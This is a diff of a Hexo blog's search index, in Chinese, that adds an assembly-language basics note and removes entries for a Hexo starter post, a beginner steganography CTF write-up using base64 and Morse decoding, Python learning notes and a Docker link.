+<h5 id="1-机器语言"><a href="#1-机器语言" class="headerlink" title="1.机器语言"></a>1.机器语言</h5><p>含义：机器指令的集合<br>   汇编语言<br>机器指令的助记符，如机器指令：1000100111011000操作——&gt;寄存器BX的内容送到AX中，汇编指令为：MOV AX,BX;</p>
+<h5 id="2-寄存器"><a href="#2-寄存器" class="headerlink" title="2.寄存器"></a>2.寄存器</h5><p>cpu中可以存储数据的器件<br>组成：a.汇编指令（机器码的助记符）<br>         b.伪指令（由编译器执行）<br>         c.（由编译器识别）<br>程序——&gt;汇编指令——&gt;编译器——&gt;机器语言——&gt;计算机<br>二进制信息：<br>1000 1001 1101 1000<br>——&gt;89D8H(数据)<br>1000 1001 1101 1000<br>——&gt;MOV AX,BX(程序)<br>cpu处理二进制；<br>B——Byte<br>1kb=1024b<br>1Mb=1024kb<br>1Gb=1024Mb<br>1Tb=1024Gb(2的10次方)<br>3.cpu进行数据读写必须和外部器件<br>（标准的说法是芯片）进行三类信息的交互<br>a.存储单元的地址（地址信息）<br>b.器件的选择，读或写命令（控制信息）<br>c.读或写的数据（数据信息）<br>存储单元从0开始顺序编号；一个存储单元可以存储8个bit，即8位二进制数；<br>1Byte=8bit,一个cpu有N根地址总线，也就是数据总线宽度为N，cpu最多可以寻找2的N次方个存储单元。</p>
+]]></content>
+      <tags>
+        <tag>汇编</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>goktech</title>
     <url>/2021/01/31/x/goktech/</url>
     <content><![CDATA[<h2 id="渗透测试思路"><a href="#渗透测试思路" class="headerlink" title="渗透测试思路"></a>渗透测试思路</h2><p>1． 信息收集</p>
@@ -1230,24 +1362,6 @@ echo "Hello World!";
       </tags>
   </entry>
   <entry>
-    <title>Hello World</title>
-    <url>/2020/11/05/x/hello-world/</url>
-    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-]]></content>
-  </entry>
-  <entry>
     <title>博客解疑</title>
     <url>/2020/10/15/x/%E5%8D%9A%E5%AE%A2%E8%A7%A3%E7%96%91/</url>
     <content><![CDATA[<h4 id="当输入hexo-s-g发布博文并预览时出现下面的提示："><a href="#当输入hexo-s-g发布博文并预览时出现下面的提示：" class="headerlink" title="当输入hexo s -g发布博文并预览时出现下面的提示："></a>当输入hexo s -g发布博文并预览时出现下面的提示：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">YAMLException: can not read a block mapping entry; a multiline key may not be an implicit key at line x, column y:</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
@@ -1269,17 +1383,6 @@ echo "Hello World!";
 ]]></content>
       <tags>
         <tag>博客</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>汇编基础知识</title>
-    <url>/2021/01/22/x/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
-    <content><![CDATA[<h4 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h4><p>了解硬件系统的结构，重点：利用硬件系统的编程结构和指令</p>
-<h5 id="1-机器语言"><a href="#1-机器语言" class="headerlink" title="1.机器语言"></a>1.机器语言</h5><p>含义：机器指令的集合<br>   汇编语言<br>机器指令的助记符，如机器指令：1000100111011000操作——&gt;寄存器BX的内容送到AX中，汇编指令为：MOV AX,BX;</p>
-<h5 id="2-寄存器"><a href="#2-寄存器" class="headerlink" title="2.寄存器"></a>2.寄存器</h5><p>cpu中可以存储数据的器件<br>组成：a.汇编指令（机器码的助记符）<br>         b.伪指令（由编译器执行）<br>         c.（由编译器识别）<br>程序——&gt;汇编指令——&gt;编译器——&gt;机器语言——&gt;计算机<br>二进制信息：<br>1000 1001 1101 1000<br>——&gt;89D8H(数据)<br>1000 1001 1101 1000<br>——&gt;MOV AX,BX(程序)<br>cpu处理二进制；<br>B——Byte<br>1kb=1024b<br>1Mb=1024kb<br>1Gb=1024Mb<br>1Tb=1024Gb(2的10次方)<br>3.cpu进行数据读写必须和外部器件<br>（标准的说法是芯片）进行三类信息的交互<br>a.存储单元的地址（地址信息）<br>b.器件的选择，读或写命令（控制信息）<br>c.读或写的数据（数据信息）<br>存储单元从0开始顺序编号；一个存储单元可以存储8个bit，即8位二进制数；<br>1Byte=8bit,一个cpu有N根地址总线，也就是数据总线宽度为N，cpu最多可以寻找2的N次方个存储单元。</p>
-]]></content>
-      <tags>
-        <tag>汇编</tag>
       </tags>
   </entry>
   <entry>
@@ -1421,89 +1524,6 @@ echo "Hello World!";
 ]]></content>
       <tags>
         <tag>upload-labs</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>新手区</title>
-    <url>/2021/04/08/misc/%E6%96%B0%E6%89%8B%E5%8C%BA/</url>
-    <content><![CDATA[<h4 id="stegnao"><a href="#stegnao" class="headerlink" title="stegnao"></a>stegnao</h4><p>打开后文档如图</p>
-<p><img src="/2021/04/08/misc/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(120).png"></p>
-<p>明显没有flag，试着用编辑器看了下，找到隐含文字</p>
-<p>Creator(LaTeX /o/)/Producer(find mr.morse text)/Keywords(Could this be the flag? : Tm9wZSAsIG5vdCBoZXJlIDspCg==)</p>
-<p>看上去像是base64，解码后果然没那么简单，提示信息flag也不在这里</p>
-<p>那么我们再从文本出发</p>
-<p>ctrl+a后到文本中，有线索了！</p>
-<p><img src="/2021/04/08/misc/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(121).png"></p>
-<p>出现了诸如BA的排列组合，联想到之前的文字里：**(find mr.morse text)**提示我们摩斯电码</p>
-<p>这里刚好莫斯电码就是以 - 和 . 来表达信息的，于是我们进行替换</p>
-<p><img src="/2021/04/08/misc/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(122).png"></p>
-<p><img src="/2021/04/08/misc/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(123).png"></p>
-<p>得到了摩斯电码后，直接上在线编码即可</p>
-<p><img src="/2021/04/08/misc/%E6%96%B0%E6%89%8B%E5%8C%BA/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(124).png"></p>
-<p>如图，flag</p>
-<p>不过我们还要按照题目要求将FLAG后字母小写，得到最后解答。</p>
-]]></content>
-      <tags>
-        <tag>攻防世界_misc</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>python</title>
-    <url>/2021/04/08/python/python-picture/</url>
-    <content><![CDATA[<h4 id="“Python之禅”"><a href="#“Python之禅”" class="headerlink" title="“Python之禅”"></a>“<strong>Python之禅”</strong></h4><p>The Zen of Python, by Tim Peters</p>
-<p>Beautiful is better than ugly.<br>Explicit is better than implicit.<br>Simple is better than complex.<br>Complex is better than complicated.<br>Flat is better than nested.<br>Sparse is better than dense.<br>Readability counts.<br>Special cases aren’t special enough to break the rules.<br>Although practicality beats purity.<br>Errors should never pass silently.<br>Unless explicitly silenced.<br>In the face of ambiguity, refuse the temptation to guess.<br>There should be one– and preferably only one –obvious way to do it.<br>Although that way may not be obvious at first unless you’re Dutch.<br>Now is better than never.<br>Although never is often better than <em>right</em> now.<br>If the implementation is hard to explain, it’s a bad idea.<br>If the implementation is easy to explain, it may be a good idea.<br>Namespaces are one honking great idea – let’s do more of those!   </p>
-<h3 id="python学习"><a href="#python学习" class="headerlink" title="python学习"></a>python学习</h3><p><img src="/2021/04/08/python/python-picture/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(126).png"></p>
-<p>在字符串中使用变量</p>
-<p><code>first_name = &quot;ada&quot;</code><br><code>last_name = &quot;lovelace&quot;</code><br><code>full_name = f&quot;&#123;first_name&#125; &#123;last_name&#125;&quot;</code></p>
-<p>要在字符串中插入变量的值，可在引号面前加上字母f，再将要插入的变量放在花括号内。这样，当python显示字符串时，将把每个变量都替换为其值。</p>
-<p>这种字符串名为f字符串。f是format格式（设置格式）的简写，因为python通过把花括号内的变量替换为其值来设置字符串的格式。上述输出的代码如下</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ada lovace</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/04/08/python/python-picture/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(127).png"></p>
-<p>last_owned = motorcycles.pop[0],默认是将最后一个元素“弹出栈元素”</p>
-<p>remove删除特定元素</p>
-<p>sort自动排序</p>
-<h4 id="关于循环"><a href="#关于循环" class="headerlink" title="关于循环"></a>关于循环</h4><p>如定义变量dimension = （200，50）</p>
-<p>使用循环时却是：for dimension in dimensions:</p>
-<p>​                               print(dimensions)</p>
-<p><img src="/2021/04/08/python/python-picture/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(132).png"></p>
-<h4 id="闲暇的佩奇"><a href="#闲暇的佩奇" class="headerlink" title="闲暇的佩奇"></a>闲暇的佩奇</h4><p><img src="/2021/04/08/python/python-picture/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(131).png"></p>
-<h4 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h4><p>一度中断，貌似是为了之前的python2.7.11来执行sqlmap，这次好像不能同时添加路径，不然就报错</p>
-<h4 id="windows终端运行python程序"><a href="#windows终端运行python程序" class="headerlink" title="windows终端运行python程序"></a>windows终端运行python程序</h4><p>如下图所示嗷</p>
-<p><img src="/2021/04/08/python/python-picture/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(133).png"></p>
-<h4 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h4><p>python的循环虽然没有像c语言一样样式看起来比较繁杂，</p>
-<p>但是还是有一定要求的</p>
-<p>比如尝试while循环时，出现了以下情况：</p>
-<p>我想实现的功能是将1赋值给current_number后，进入循环，直到current_number大于5</p>
-<p>这里没有空格（也就是和print对齐）造成了无限加1的画面。</p>
-<p>修改之后：</p>
-<p>发现python真的好坑（有点无语），对于对齐和空格有着严格的要求</p>
-<p>比如没有遵守就会出现以下画面和英文提示:</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Inconsistent use of tabs and spaces in indentation</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">IndentationError: unindent does not match any outer indentation level</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://img-blog.csdnimg.cn/2019031210572084.png" alt="问题"></p>
-<p>成功找到解决方法，一个是pycharm软件格式化，不过我已经删掉</p>
-<p>另外就是用notepad++的视图里显示空格，见文章：<a href="https://blog.csdn.net/hhy_csdn/article/details/82263757">https://blog.csdn.net/hhy_csdn/article/details/82263757</a></p>
-<h4 id="传递任意数量的实参"><a href="#传递任意数量的实参" class="headerlink" title="传递任意数量的实参"></a>传递任意数量的实参</h4><p>例如，来看一个制作披萨的函数，它需要接受很多配料，但无法预先确定顾客要多少种配料。</p>
-<p>下面的函数只有一个形参*toppings,但不管调用语句提供了多少实参，这个形参会将它们统统收入囊中。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def make_pizza(*toppings):</span><br><span class="line">	&quot;&quot;&quot;打印顾客点的所有配料。&quot;&quot;&quot;</span><br><span class="line">	print(toppings)</span><br><span class="line">make_pizza(&#39;pepproni&#39;)</span><br><span class="line">make_pizza(&#39;mushrooms&#39;,&#39;green peppers&#39;,&#39;extra cheese&#39;)</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/04/08/python/python-picture/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(142).png"></p>
-]]></content>
-      <tags>
-        <tag>python</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>docker</title>
-    <url>/2021/04/25/docker/docker/</url>
-    <content><![CDATA[<p><a href="https://blog.csdn.net/q610376681/article/details/90483576?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161934162316780271527251%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=161934162316780271527251&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-3-90483576.first_rank_v2_pc_rank_v29&amp;utm_term=docker&amp;spm=1018.2226.3001.4187">https://blog.csdn.net/q610376681/article/details/90483576?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161934162316780271527251%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=161934162316780271527251&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-3-90483576.first_rank_v2_pc_rank_v29&amp;utm_term=docker&amp;spm=1018.2226.3001.4187</a></p>
-<p>这篇文章不错喔</p>
-]]></content>
-      <tags>
-        <tag>web</tag>
       </tags>
   </entry>
 </search>
